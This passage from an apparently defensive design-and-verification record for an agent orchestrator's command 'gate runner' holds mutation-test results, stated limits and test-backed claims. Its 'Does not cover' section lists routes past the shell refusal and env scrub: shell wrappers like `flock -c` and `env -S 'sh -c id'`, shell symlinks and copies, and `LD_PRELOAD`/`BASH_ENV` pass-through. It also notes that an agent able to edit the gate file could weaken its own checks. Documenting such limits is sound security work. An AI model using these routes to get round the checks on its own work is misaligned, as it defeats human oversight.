| H6-sudo | wrapper sudo dropped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H6-taskset | wrapper taskset dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-time | wrapper time dropped | KILLED | test_the_documented_wrapper_false_positives_are_refused |
| H6-timeout | wrapper timeout dropped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H6-toybox | wrapper toybox dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-unshare | wrapper unshare dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-xargs | wrapper xargs dropped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| S01 | stream: cwd not passed to Popen | KILLED | test_a_declared_shell_gate_still_runs_through_sh_when_allowed |
| S02 | stream: stdin inherited | KILLED | test_spawn_arguments |
| S03 | stream: no new session (no process group) | KILLED | test_spawn_arguments |
| S04 | stream: kill the child only, not the group | KILLED(rerun) | test_timeout_kills_the_whole_process_group |
| S05 | stream: shell=True | KILLED | test_proof_plain_string_runs_as_argv |
| S07 | stream: stdin is an open pipe | KILLED | test_spawn_arguments |
| S08 | stream: KEY dropped from the env scrub | KILLED | test_env_is_scrubbed |
| S09 | stream: PASSWORD dropped from the env scrub | KILLED | test_env_is_scrubbed |
| S10 | stream: SECRET dropped from the env scrub | KILLED | test_env_is_scrubbed |
| S11 | stream: TOKEN dropped from the env scrub | KILLED | test_spawn_arguments |
| S12 | stream: env scrub is case-sensitive | KILLED | test_env_is_scrubbed |
| S13 | stream: env not scrubbed at all | KILLED | test_spawn_arguments |
| S14 | stream: cwd defaults to the filesystem root | KILLED | test_stream_process_cwd_defaults_to_the_current_folder_and_can_be_set |
| S15 | stream: a missing cwd falls back to the filesystem root | KILLED | test_stream_process_cwd_defaults_to_the_current_folder_and_can_be_set |
| S06 | stream: cwd from the process folder | KILLED | test_a_declared_shell_gate_still_runs_through_sh_when_allowed |
| Z01 | zip(strict=True) | SURVIVED | EQUIVALENT: plans has one entry per gate, so strict only guards an impossible length mismatch |
| Z02 | zip(strict=True) | SURVIVED | EQUIVALENT: ready has one entry per gate when the refusal branch did not return |
| Z03 | isinstance(p, str) | SURVIVED | EQUIVALENT: plan_gate returns exactly Plan or str |
| Z04 | timeout default via entry.get | SURVIVED | EQUIVALENT: an explicit null gives get() -> None -> _timeout(None) -> None, the same refusal |
| Z05 | SandboxDenied | SURVIVED | EQUIVALENT: SandboxDenied subclasses PermissionError, an OSError, and exc.reason exists on it |


## Does not cover

- **Shells are refused only in the cases of Design 4b.** NOT detected: wrappers not on the list, wrapper chains, interpreters (`python -c`, `perl -e`, `awk system()`, `node -e`), `make`, scripts, and any program that itself starts a shell. `shell: true` plus `--allow-shell` is a declaration convention that stops the string form turning into a shell by accident; it is not a control and not a sandbox.
- **The matrix limits (rev 3c, N48; each pinned by a row that really runs the marker):** `r56` `env ./link-to-a-shell` (the wrapper rule compares argument NAMES, not what a link points at); `l01` a copy of a shell; `l02` a hard link of a shell; `l03` a symlink to a wrapper (`env`); `l04` an earlier PATH file that exec skips (no shebang); `l05` a shell outside the 14 names (`ksh93`). Closed in rev 3c, for the record: every row that put a `..`, `/proc` or `/dev` between the runner's view and the child's. A row whose child resolves differently from the plan is either refused or one of these six; nothing else is known to differ, which is a statement about the 64 rows and the fuzz, not a proof.
- **Known unverified, rev 3c (stated, none closed):** Windows and macOS (no run; the module is POSIX only); a GitHub CI run on 3.12 (local runs only: 3.11, 3.12, 3.13 here); SIGKILL of the runner orphans a running gate; wrappers, interpreters and scripts (`python -c`, `perl -e`, `awk`, `node -e`, `make`, any script, wrappers not on the list, wrapper chains); `LD_PRELOAD`, `BASH_ENV`, `ENV`, `PYTHONSTARTUP` and `PYTHONHOME` pass through the env scrub (names only); copies and hard links of a shell (rows l01, l02); a link made by an earlier gate; the plan-to-spawn TOCTOU; a bind mount of `/proc` elsewhere and case-insensitive volumes. The matrix and the fuzz are evidence about what they cover, not a proof that a sixth mismatch does not exist.
- **Also not detected by the shell refusal (rev 3b, stated; N45):** an executable earlier on PATH that exec skips for another reason (no shebang, a missing interpreter) followed by a same-name shell link (the plan accepts, the child runs the shell; pinned by a test); shells outside the 14 listed names (`ksh93`, `elvish`, `nu`, `xonsh`, versioned names such as `bash5.2`); the older tests link to the host's `sh` and would fail where `sh` is a busybox applet (Alpine UNVERIFIED); `/proc` and `/dev` are refused outright but each audit round found another path-resolution mismatch of the same class, so the refusal is a speed bump, not a sandbox. Also (rev 3): a copy, a hard link or a renamed shell; a symlink to a wrapper; a link made by an EARLIER gate of the same file (every gate is validated before any runs; a link that already exists is caught from any cwd); programs that run a shell without naming one (`flock -c`, `script -qec`, `runuser -c`, `parallel 'a;b'`, `sudo -s`, `env -S 'sh -c id'`; `flock` and `script` ran for real in the judge's probe). Pinned by `test_the_stated_residual_limits_of_the_shell_refusal_are_pinned`.
- **Signals (rev 3, stated):** a runner started with SIGHUP ignored (nohup) dies with rc 129 and no report, because the handler overrides the ignore; a SystemExit between `Popen` and the `try` in `stream_process` (sub-millisecond) orphans the gate.
- **Not a sandbox.** A gate is trusted operator data. A list-form gate can run any program with any argument; the guard is a tripwire (`safety.py:3-8`); `python -c "..."` bodies, `make` targets and scripts are not inspected. The policy stops ACCIDENTAL shell syntax and obvious destructive/credential commands, not a hostile gate author.
- **Who may edit the gate file is not enforced.** If the agent whose work is checked can edit `gates.json`, it can delete or weaken gates. `--allow-shell` only stops the shell escalation. Keep the file outside the agent's write fence, in review.
- **No baseline or regression compare for gates, no retry, no repair loop.** OH29's bounded repair attempts (`service.py:70`, `:1208-1213`, `:1595`) consume a gate failure; this item only produces it (`status`, `exit_code`, redacted tails). A flaky gate is a `fail`.
- **The exit code is the whole verdict.** There is no `expect output` key: a wrapper that exits 0 after a failed step passes. A silent exit-0 gate passes.
- **The metacharacter rule is conservative** (false-positive list in Design 3) and the string form has no tilde, glob, brace, comment or variable expansion; the list form is the way out.
- **`scrubbed_env` removes names, not values**, and only names containing KEY, PASSWORD, SECRET or TOKEN: `LD_PRELOAD`, `BASH_ENV`, `ENV`, `PYTHONSTARTUP`, `PYTHONHOME` and `PYTHONPATH` pass through to the gate (the operator's own environment, the gate runs as the operator, and a name list is never complete once wrappers exist; `gates.py` could drop them locally, left as a follow-up): `DATABASE_URL` with a password inside still reaches the child. `PATH` passes through.
- **SIGKILL of the runner itself** cannot be handled: a running gate's process group is orphaned (SIGTERM, SIGHUP and SIGINT are handled, N36). A Linux-only `PR_SET_PDEATHSIG` would not cover the grandchildren either.
- **A child that leaves the process group** (`setsid`, double fork with `setsid`) survives the group kill. A grandchild that stays in the group and holds the pipes makes the gate a `timeout`.
- **A secret longer than the 64,000-byte capture window** can leave a fragment of its tail in the report, because the part that carries the rule's anchor was cut before redaction. Every shorter secret shape is replaced before the 4,000-character cut.
- **TOCTOU on cwd** between the plan and the spawn (a fence, not a sandbox), and the guard resolves relative path words against the process cwd, not the gate cwd.
- **Total time** can overrun `total_s` by the kill-and-join time of the running gate (up to about 5 s). The total budget is a keyword of `run_gates`, not a CLI flag; the CLI always uses 3,600 s. A per-gate `timeout_s` is capped at 1,800 s.
- **Output decoding** replaces invalid UTF-8; only the last 64,000 bytes per stream are kept.
- **Windows and macOS: UNVERIFIED** (Design 13). **CI on 3.12 was not run here**; the full suite and the new tests were run locally on 3.11, 3.12 and 3.13 only.
- **`run_gates` called from Python** accepts `Gate` lists with duplicate ids (and reports each); only the file loader refuses them.
- **Programmatic use of `shell`**: a `Gate(shell=True)` built in code is still subject to `allow_shell`, the length cap and the guard.
- **Prose and docs**: no README, CLAUDE.md or skill text was edited by this item; wiring the gate runner into the orchestrator's QA phase is a separate change.

## Authority List

Rows A1-A26 cite `references/`. N-rows are net-new own-code claims, each with a check that can fail: a named test, a mutant id from the table above, or a grep/command that must return the stated result on the final files. `O/` abbreviates `references/openharness/`.

| id | claim | evidence | slice |
|---|---|---|---|
| A1 | A gate entry is a string or a mapping with a `command` key; any other type is a policy error | references/openharness/src/openharness/autopilot/service.py:167 | C9 |
| A2 | Without the opt-in an entry runs as argv with `shell=False`; with it the raw text is handed to a shell; an entry carrying an error must not be executed | references/openharness/src/openharness/autopilot/service.py:143 | C9 |
| A3 | The metacharacter set is `; & | ` $ < >`, newline and carriage return | references/openharness/src/openharness/autopilot/service.py:136 | C9 |
| A4 | The metacharacter scan runs on the raw string before tokenising, so a metacharacter inside quotes is refused (stated as intended) | references/openharness/src/openharness/autopilot/service.py:175 ; references/openharness/tests/test_autopilot/test_verification.py:214 | C9 |
| A5 | The refusal message points at the `shell: true` opt-in | references/openharness/src/openharness/autopilot/service.py:180 ; references/openharness/tests/test_autopilot/test_verification.py:46 | C9 |
| A6 | Tokenising uses `shlex.split`; a `ValueError` (unclosed quote) becomes a policy error | references/openharness/src/openharness/autopilot/service.py:185 ; references/openharness/tests/test_autopilot/test_verification.py:88 | C9 |
| A7 | CHANGED r2: A blank string (:165), a blank mapping command (:158) and an empty argv (:194) are all the error `empty command` | references/openharness/src/openharness/autopilot/service.py:158 ; references/openharness/src/openharness/autopilot/service.py:165 ; references/openharness/src/openharness/autopilot/service.py:194 | C9 |
| A8 | A mapping with `shell` true skips the scan and keeps the raw text; with it false or absent it falls through to argv validation, and `shell: False` with metacharacters is still refused | references/openharness/src/openharness/autopilot/service.py:160 ; references/openharness/tests/test_autopilot/test_verification.py:70 | C9 |
| A9 | The reference turns the shell flag into a boolean with `bool(...)`, so any non-empty value (the string "false" included) enables the shell; this design requires a JSON boolean instead (deliberate departure) | references/openharness/src/openharness/autopilot/service.py:160 | C9 |
| A10 | A refused entry becomes an error step (returncode -1, status error) and nothing is spawned for it | references/openharness/src/openharness/autopilot/service.py:2097 ; references/openharness/tests/test_autopilot/test_verification.py:111 | C9 |
| A11 | After a refused entry the reference loop `continue`s and still runs the remaining commands; this design runs none (deliberate departure) | references/openharness/src/openharness/autopilot/service.py:2106 | C9 |
| A12 | The argv path calls `subprocess.run` with a list and `shell=False`; the shell path passes the raw string with `shell=True` | references/openharness/src/openharness/autopilot/service.py:2107 ; references/openharness/tests/test_autopilot/test_verification.py:133 | C9 |
| A13 | The reference spawn inherits the env and stdin, uses one 1,800 s timeout and unbounded capture, and creates no process group (each is added here) | references/openharness/src/openharness/autopilot/service.py:2109 | C9 |
| A14 | A missing executable is an error step, never a pass | references/openharness/src/openharness/autopilot/service.py:2127 ; references/openharness/tests/test_autopilot/test_verification.py:195 | C9 |
| A15 | A timeout becomes an error step with the text `Timed out after`; here it gets its own status `timeout` | references/openharness/src/openharness/autopilot/service.py:2136 | C9 |
| A16 | The report keeps the last 4,000 characters of each stream | references/openharness/src/openharness/autopilot/service.py:2123 | C9 |
| A17 | Return code 0 is success and any other code is failed | references/openharness/src/openharness/autopilot/service.py:2122 | C9 |
| A18 | The reference silently drops commands that look unavailable (pytest without a tests folder, tsc without the frontend package file); this design drops nothing | references/openharness/src/openharness/autopilot/service.py:199 ; references/openharness/src/openharness/autopilot/service.py:2090 | C9 |
| A19 | An empty command list is accepted and reported as "No verification commands were applicable"; here it is an error | references/openharness/src/openharness/autopilot/service.py:2169 | C9 |
| A20 | A policy file that is missing, unreadable or not a mapping is replaced by the defaults (OH81; not adopted, here every such case is exit 2) | references/openharness/src/openharness/autopilot/service.py:2002 | C9 |
| A21 | The verification policy is one of three policy files loaded together by `load_policies` (pattern only) | references/openharness/src/openharness/autopilot/service.py:492 | C9 |
| A22 | The default policy is plain strings plus one mapping that opts into the shell | references/openharness/src/openharness/autopilot/service.py:90 ; references/openharness/tests/test_autopilot/test_verification.py:94 | C9 |
| A23 | CHANGED r2: The repair loop (OH29) is bounded at three attempts by default (a policy-configurable value, `max_attempts` 3 at :70, read at :1208); it consumes a gate failure and is not part of this item | references/openharness/src/openharness/autopilot/service.py:70 ; references/openharness/src/openharness/autopilot/service.py:1208 | C9 |
| A24 | The reference pins the real-subprocess path end to end with the interpreter's own `--version` | references/openharness/tests/test_autopilot/test_verification.py:223 | C9 |
| A25 | A detached child is its own process group and the whole group is signalled with a negative pid, never throwing (the idea `stream.py` already adapted) | references/deepseek_harness/packages/subprocess/subprocess-local/src/spawn.ts:260 ; references/deepseek_harness/packages/subprocess/subprocess-local/src/spawn.ts:358 | C9 |
| A26 | OpenHarness is MIT licensed | references/openharness/LICENSE:1 | C9 |
| N1 | NET-NEW: the gate runner is a separate module and the C4 runner is byte-identical. Check: `sha256sum src/master_finhub/evals/runner.py` = c34f998b...06166e6 before and after; `git apply --stat` lists no `runner.py`; `grep -c gates src/master_finhub/evals/runner.py` = 0; `test_runner_contract_is_untouched`, `test_a_gate_file_is_not_a_c4_baseline`, `test_cli_bad_arguments_exit_2`; the unmodified `tests/test_evals_baseline.py` passes; mutants M14, M20 die | own code `runner.py:284,305-313` | C9 |
| N2 | NET-NEW: the file is strict JSON: every listed case is exit 2 with a message that never echoes content. Check: `test_bad_file_is_refused_and_exit_2` (63 documents), `test_bad_raw_file_is_refused` (15 raw files incl. NaN, duplicates, BOM, bad UTF-8, 250,000-deep nesting, a 5,000-digit int), `test_good_file_loads_exactly`; mutants L01-L28, P01-P36, X30-X32 die (L24 and Z04 are declared equivalent) | own code | C9 |
| N3 | NET-NEW: an empty gate list is an error at the loader AND in `run_gates`. Check: `test_empty_gate_list_exit_2_nothing_runs`, `test_run_gates_refuses_an_empty_list`; mutants L18, L19, F01 die | own code | C9 |
| N4 | NET-NEW: exit 0 only for a non-empty all-pass list; 1 for fail/timeout/error/not-run; 2 for an unusable file, a refusal, an internal error or a lost report; no 3. Check: `test_status_to_exit_code` (12 cases), `test_cli_exit_codes_with_real_processes`, `test_unexpected_error_is_exit_2_and_never_echoes_the_text`; mutants F23-F30, M07, M08, M10 die | own code | C9 |
| N5 | NET-NEW: a lost report is exit 2 for every outcome, using the runner's `_stdout_lost`. Check: `test_a_lost_report_is_exit_2` (4 outcomes x write/flush), `test_closed_stdout_is_exit_2`, `test_full_disk_buffered_stdout_is_exit_2` (real `/dev/full`), `test_keyboard_interrupt_while_writing_the_report_propagates`; `grep -n _stdout_lost src/master_finhub/evals/gates.py` = 4 lines; mutants M11, M15-M19 die | own code `runner.py:263-269` | C9 |
| N6 | NET-NEW: string form = strip, 4,096 cap, metacharacter scan on the raw text with the reference's exact set, `shlex.split`, tokenisation error; each metacharacter and each false positive is pinned. Check: `test_every_metacharacter_is_refused[...]` (9), `test_metacharacters_refused_even_inside_quotes` (16), `test_plain_strings_become_argv` (16), `test_plain_strings_refused` (15); mutants A01-A10, X01-X21 die | own code | C9 |
| N7 | NET-NEW: the list form `argv` is passed verbatim and has no metacharacter rule. Check: `test_argv_form_is_verbatim`; mutants Q12, Q14 die | own code | C9 |
| N8 | NET-NEW: the executable must be non-empty, must not start with `-` and must not contain `=`. Check: `test_plain_strings_refused`, `test_argv_form_refused`, `test_later_argument_may_start_with_dash_and_contain_equals`; mutants R08-R13 die | own code | C9 |
| N9 | NET-NEW: argv is pre-checked for size (256 items, 4,096 chars), NUL and UTF-8 encodability, so `Popen`'s own errors are never the line of defence. Check: `test_argv_item_*`, `test_argv_form_refused[NUL, surrogates]`, `test_plain_strings_refused[NUL]`; mutants R01-R07 die | own code | C9 |
| N10 | CHANGED r2 (scope stated): NET-NEW: `shell: true` needs the JSON boolean, `command` (not `argv`), a non-blank string of at most 4,096 characters, `--allow-shell` and a POSIX host; it runs as `/bin/sh -c` through `stream_process`. This claim is about the `shell` key only; what else can start a shell is N37-N38 and Decision 3. Check: `test_shell_gate_*` (6), `test_proof_shell_true_only_when_declared_and_allowed`, `test_cli_allow_shell_flag`, the `shell-*` documents of N2; mutants Q01-Q11, F02, F03, F34, M01, M02 die | own code | C9 |
| N11 | NET-NEW: the command guard and the sensitive-path denylist apply to every gate, through `guard_tool_call` with the command line and the resolved cwd; a guard crash is a refusal. Check: `test_guard_denial_is_a_policy_error` (12 incl. shell forms), `test_guard_allows_ordinary_gates`, `test_guard_runs_on_the_joined_argv_and_is_called_once`, `test_a_guard_crash_is_a_refusal_not_a_spawn`, `test_a_credential_folder_is_refused_as_cwd_even_inside_the_root` (5); `grep -n "guard_tool_call(" gates.py` = 1 call; mutants Q11, Q15, Q23, Q24, Q24b, Q24d, Q25, Q25b, Q28-Q30 die (Q24c is declared equivalent) | own code `safety.py:526-543,605-651` | C9 |
| N12 | NET-NEW: gate cwd is fenced by `Workspace.check_read` (root itself allowed, symlink escape and `..` refused) and must be an existing folder; the child really starts there. Check: `test_cwd_*` (8), `test_shell_gates_are_fenced_too`, `test_cli_root_flag_*`; mutants Q17-Q22b, Q26, E06, E07, S01, S06, S14, S15 die | own code `workspace.py:120-149` | C9 |
| N13 | NET-NEW: every gate is planned before any is spawned; one refusal means no `Popen`, `not-run` for the others, exit 2. Check: `test_a_refused_gate_spawns_nothing_and_skips_every_gate` (30 cases, the spy raises on any `Popen`), `test_two_refused_gates_are_both_reported`, `test_refused_gates_never_run_even_if_the_flag_is_on`, `test_policy_error_report_exit_2`, `test_proof_metachar_is_a_policy_error_and_nothing_spawns`; mutants F04-F08, Q28-Q30 die | own code | C9 |
| N14 | NET-NEW: the spawn is `stream_process(list, env=scrubbed_env(), cwd=..., timeout)`: no shell, scrubbed env, closed stdin, new session. Check: `test_spawn_arguments` (spy kwargs), `test_stdin_is_closed_not_inherited`, `test_env_is_scrubbed`; `grep -c "shell=True" gates.py` = 0, `grep -nE "import subprocess|os\.system|os\.popen" gates.py` rc 1, `grep -n "stream_process(" gates.py` = 1 call; mutants E01-E07, S02, S05, S07-S13 die | own code `stream.py:22-35,118-141` | C9 |
| N15 | NET-NEW: a timeout kills the whole process group and is reported `timeout`, never `pass`. Check: `test_timeout_kills_the_whole_process_group`, `test_a_daemonised_grandchild_holding_the_pipe_is_a_timeout_not_a_pass`, `test_proof_timeout_is_timeout_never_pass`, `test_timeout_keeps_the_output_so_far`, `test_timeout_outranks_an_exit_code_of_zero`; mutants S03, S04, E03-E05, E13, E14, E21, E22 die | own code `stream.py:76-87,155-188` | C9 |
| N16 | NET-NEW: status mapping: 0 -> pass; other codes and signals -> fail; spawn failure -> error; no exit status -> error; never a pass for any of them. Check: `test_exit_code_mapping`, `test_signal_death_message_and_exit_1`, `test_missing_executable_is_an_error_not_a_pass`, `test_not_executable_is_an_error`, `test_other_spawn_failures_are_errors_without_the_exception_text`, `test_unexpected_exception_while_collecting_is_an_error`, `test_keyboard_interrupt_is_not_swallowed`, `test_missing_exit_status_is_an_error`; mutants E08-E22, E38-E40 die | own code | C9 |
| N17 | NET-NEW: tails are redacted by the C3 rule table BEFORE the 4,000-character cut; the capture window is exactly 64,000 bytes; both flags are reported. Check: `test_tails_are_redacted`, `test_redaction_happens_before_the_tail_is_cut`, `test_tail_boundary` (4 sizes), `test_the_tail_is_the_end_of_the_output`, `test_stderr_tail_is_cut_too`, `test_huge_output_is_bounded`, `test_capture_truncation_counts_even_when_redaction_shrinks_the_text`, `test_the_capture_window_is_exactly_64000_bytes`; mutants K13, K14, E23-E33 die | own code `secret_scan.py:98-103`, `stream.py:23,214-226` | C9 |
| N18 | NET-NEW: total budget 3,600 s: the running gate gets `min(timeout_s, remaining)`, an exhausted budget is `not-run` (exit 1), never a pass. Check: `test_total_budget_*` (3), `test_per_gate_timeout_is_the_smaller_of_gate_and_remaining`, `test_the_documented_bounds`; mutants K12, F09-F17 die | own code | C9 |
| N19 | NET-NEW: every gate runs, in declared order, with no fail-fast, no dedupe and no reordering; a dropped gate at load or run is caught. Check: `test_every_gate_runs_after_a_failure`, `test_one_spawn_per_gate_in_declared_order`, `test_declared_order_is_kept_not_sorted`, `test_duplicate_ids_never_swallow_a_gate`, `test_good_file_loads_exactly`, `test_gate_count_boundary`; mutants F17-F22 (F22 under hash seeds 0-39), L26-L28 die | own code | C9 |
| N20 | NET-NEW: report schema (`schema_version`, `kind`, `gates`, `passed`, `failed`, `total`, `ok`; per gate `id status exit_code duration_s stdout_tail stderr_tail truncated message`), fixed key order, no command/argv/cwd/env, deliberately not a C4 report. Check: `test_report_schema_and_key_order`, `test_the_report_never_contains_the_command_or_the_env`, `test_a_gate_file_is_not_a_c4_baseline` (real CLI output into `load_baseline` and `runner.main --baseline`, both exit 2), `test_non_ascii_output_survives_an_ascii_stdout`; mutants M12-M14, M23, E35-E37 die | own code | C9 |
| N21 | NET-NEW: determinism: identical reports except `duration_s`. Check: `test_same_file_same_report_apart_from_durations`, `test_declared_order_is_kept_not_sorted`; ordering mutants F19, F20, F22 killed under PYTHONHASHSEED 0-39 | own code | C9 |
| N22 | NET-NEW: refusal and error messages never contain the command, argument, cwd text or an exception text. Check: `test_a_refusal_never_echoes_the_command_or_cwd` (11), `test_other_spawn_failures_are_errors_without_the_exception_text`, `test_unexpected_error_is_exit_2_and_never_echoes_the_text`; mutants Q31-Q35, E12, M09 die | own code `safety.py:567-571` | C9 |
| N23 | NET-NEW and UNVERIFIED on Windows and macOS: the module is POSIX only (`sensitive_paths.py` opens with `O_PATH`/`dir_fd` and fails loudly elsewhere); the one proven non-POSIX behaviour is the shell refusal. Check: `grep -n "O_PATH" src/master_finhub/tools/sensitive_paths.py` returns 3 lines (the docstring twice and the flag constant), `test_shell_gate_is_refused_without_posix`; mutants Q07, Q08 die; no other claim is made | own code `sensitive_paths.py:4-7` | C9 |
| N24 | CHANGED r3c (counts and matrix rerun): NET-NEW: Python-version triggers behave the same on 3.11, 3.12 and 3.13. Check: `test_bad_raw_file_is_refused[deep-nesting]`, `[deep-nesting-object]`, `[huge-int-digits]`, the surrogate/NUL cases and the whole file run on each of the three interpreters (677 passed on each, `-W error` clean) and in the environment matrix of Proof 10 (nobody, root, `env -i`, `trap '' INT`, nohup, closed stdin); the full suite on 3.11 (both buffering modes) and 3.12 (2081 passed, 10 skipped) | own code | C9 |
| N25 | CHANGED r2 (grep): NET-NEW, quant G1 transaction fees: N/A, gates run commands and read an exit code, no trade is modelled. Check: `grep -ciE "slippage|borrow|survivorship|pnl|fees?" src/master_finhub/evals/gates.py` = 0 (rev 2: word-boundary pattern, "feed" no longer matches) | own code | C9 |
| N26 | NET-NEW, quant G2 borrow costs: N/A (no positions, no financing); same grep | own code | C9 |
| N27 | NET-NEW, quant G3 slippage: N/A (no fills); same grep | own code | C9 |
| N28 | NET-NEW, quant G4 look-ahead: N/A for the module (it reads no series); stated limit: a gate cannot see look-ahead inside the command it runs, so quant checks must be gates that fail on a seeded leak | own code | C9 |
| N29 | NET-NEW, quant G5 survivorship: N/A (no universe); same limit as N28 | own code | C9 |
| N30 | NET-NEW, quant G6 train/test leakage: N/A (no split, no scaler); same limit as N28 | own code | C9 |
| N31 | NET-NEW: `gates.py` contains no regex; the two regex-bearing modules it feeds (`secret_scan`, `safety`) are fast on every shape at 4,096 / 200,000 / 1,000,000 characters. Check: `test_the_module_has_no_regex`; `grep -nE "^import re|^from re " gates.py` rc 1; `02_strategy-architect_C9_redos.py` prints `overall OK` with 346 rows, slowest 0.140 s (3.11), 0.146 s (3.12), 0.125 s (3.13) | own code | C9 |
| N32 | NET-NEW: the only edit to an existing source file is the `cwd` keyword of `stream_process`, default `None` (old behaviour). Check: the diff is `+4` lines; `grep -n "cwd=cwd" stream.py` = 1 line; `test_stream_process_cwd_defaults_to_the_current_folder_and_can_be_set`; `tests/test_stream.py` unmodified and passing; mutants S01, S06, S14, S15 die | own code `stream.py:118-141` | C9 |
| N33 | NET-NEW: licence hygiene: the module docstring carries `adapted ... references/openharness/src/openharness/autopilot/service.py:155 (MIT)`; no verbatim run of 8 words from the reference service or test file appears in `gates.py`, `stream.py` or `test_gates.py` except the import line `from pathlib import Path` `from typing import Any`; no file from the Polyform-licensed AutoGPT platform tree was opened or cited. Check: `grep -n "references/openharness" src/master_finhub/evals/gates.py` = 1 line (docstring); the 8-word script (`verbatim.py`, words lower-cased, punctuation split) prints hits only for that import pair; the reference test payloads were re-worded in the tests | own code | C9 |
| N34 | NET-NEW: no complete credential shape is committed; the test builds its fake key at runtime. Check: the secrets grep over the three files returns rc 1 (Proof 6) | own code | C9 |
| N36 | CHANGED r2: NET-NEW: a SIGINT, SIGTERM or SIGHUP delivered to the runner kills the running gate's process group, writes no report and exits with a code outside 0/1/2 (143 for SIGTERM, 129 for SIGHUP, death by SIGINT); the handlers are scoped to the run, restored afterwards (SIG_DFL when the old handler was installed from C) and skipped off the main thread; SIGKILL is not handled (Does not cover). Check: `test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass` (3, real process), `test_the_handlers_unwind_with_128_plus_the_signal_and_are_restored` (2), `test_the_handlers_are_left_alone_off_the_main_thread`, `test_a_handler_installed_from_c_is_restored_to_the_default`; `grep -n "_signals_raise" gates.py` = 2 lines; mutants G01-G14 die | own code `stream.py:155-188` | C9 |
| N37 | CHANGED r3c: NET-NEW (ATK1, ATK4): in a NON-shell gate a shell as the executable is refused with a policy error that spawns nothing: basename (lower case, `.exe` stripped), or the basename of what the child's exec finds, resolved from the gate's cwd: symlinks reached by an absolute path, a cwd-relative path or PATH (with `/proc` and `/dev` refused outright, N43); a declared `shell: true` gate is not affected. Check: `test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate` (41), `test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper` (14), `test_a_symlink_that_points_at_a_shell_is_refused_whatever_it_is_called`, the cwd-relative tests of N41, `test_a_file_named_sh_is_refused_by_name_even_when_it_is_not_a_shell`, `test_a_shell_gate_in_a_file_spawns_nothing_and_exits_2` (real CLI: exit 2, `out.txt` absent), `test_a_declared_shell_gate_still_runs_through_sh_when_allowed`, `test_the_shell_check_never_runs_on_a_declared_shell_gate_argv`, `test_ordinary_programs_are_not_mistaken_for_shells`; `grep -n "_shell_refusal" gates.py` = 2 lines (def and one call, after the cwd fence); mutants H01-H10, H18-H23, H3-*, T01-T13 die | own code | C9 |
| N41 | CHANGED r3c: NET-NEW (ATK4): for a path with a `/` that is not under `/proc` or `/dev` (N43), and for a PATH search, the shell check resolves `argv[0]` from the GATE's cwd, not the runner's: the judge's two repros (`./mysh -> /bin/sh`, gate cwd `sub`, runner in the parent; runner in `other/` with `--root ../sub`) are policy errors that spawn nothing and create no file. Check: `test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd` and `test_a_relative_symlink_is_refused_when_the_runner_is_in_another_folder` (spawn spy: 0 calls, no out file), `test_the_real_cli_refuses_a_relative_link_to_a_shell_and_creates_nothing` (2, real CLI, exit 2, no `out.txt`), `test_the_relative_path_entry_is_not_taken_from_the_runner_cwd`; these fail on the rev-2 tree (10 failures, Proof 12); `grep -c "_resolve" gates.py` = 2 (def and one call); mutants T01, T07, T08, T10, T12 die | own code | C9 |
| N42 | CHANGED r3b (first-hit pinned): NET-NEW (ATK4): a bare name is searched along PATH as `Popen`'s exec does from the gate's cwd: the FIRST executable regular file (`test_the_first_path_hit_wins_not_the_last`), an empty or relative entry means the gate's cwd, a non-executable file is skipped. Pinned residual limits (Does not cover, tested so they cannot drift silently): a copy, a hard link, a renamed shell, a symlink to a wrapper and a link made by an earlier gate are NOT detected. Check: `test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd` (5 PATH values), `test_a_non_executable_file_on_path_is_skipped_like_the_child_does`, `test_the_stated_residual_limits_of_the_shell_refusal_are_pinned`, `test_the_documented_wrapper_false_positives_are_refused` (3); mutants T02-T06, T09, T11 die, and the judge's K08 (last hit) dies (N44) | own code | C9 |
| N38 | NET-NEW (ATK1): `su` and `watch` are refused outright; 29 listed one-hop wrappers are refused when any later argument has a shell basename and allowed otherwise; wrappers not on the list and chains are NOT detected (stated). Check: `test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise` (29), `test_programs_that_run_a_shell_by_design_are_refused_outright` (2), `test_shell_names_and_wrappers_are_the_documented_lists` (the lists are pinned verbatim); mutants H11-H17, H4-*, H5-*, H6-* die | own code | C9 |
| N39 | NET-NEW (ATK1 wording): the design, the module docstring and the CLI help say plainly what is not controlled. Check: `grep -c "NOT detected" src/master_finhub/evals/gates.py` = 1; `grep -c "not a sandbox" src/master_finhub/evals/gates.py` >= 2; the sentence "editing the file alone cannot switch a shell on" is not asserted anywhere: `grep -n "editing the file alone cannot switch a shell on" _workspace/02_strategy-architect_C9.md` returns exactly 2 lines, the Revision 2 table row that quotes it as the false claim and this row | own code and this file | C9 |
| N40 | CHANGED r3c (counts and matrix rerun): NET-NEW (ATK2): no new test depends on an inherited signal disposition, tty, stdin, session or PATH permissions. Check: the 677 cases pass under `trap '' INT`, `trap '' INT HUP`, `setsid nohup ... < /dev/null`, with stdin closed, as `nobody` with the repo PATH, as root under `env -i`, on 3.11, 3.12 and 3.13 (Proof 10); the rev-1 tree fails two of these (reproduced); `grep -n "default_int_handler" tests/test_gates.py` = 1 line (`SIG_DFL` kills the runner without unwinding) | own code | C9 |
